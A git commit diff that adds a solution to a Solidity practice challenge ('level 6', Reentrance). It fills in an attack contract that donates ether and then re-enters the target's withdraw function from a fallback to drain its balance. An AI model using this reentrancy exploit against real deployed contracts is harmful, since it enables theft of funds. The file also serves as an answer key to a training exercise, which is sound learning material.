5c76c3e0a0b5ebf3480e60985ba0268a64c97be3
Matt <matt.b.wilder1@gmail.com>
2022-08-01 18:49:24 -0600

    add solution for level 6

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,20 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance public reentranceContract;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentranceContract = Reentrance(contractAddress);
     }
 
     function hackContract() external {
         // Code me!
+        reentranceContract.donate{value: address(this).balance}(address(this));
+        reentranceContract.withdraw();
+    }
+
+    fallback() external payable {
+        reentranceContract.withdraw();
     }
 }
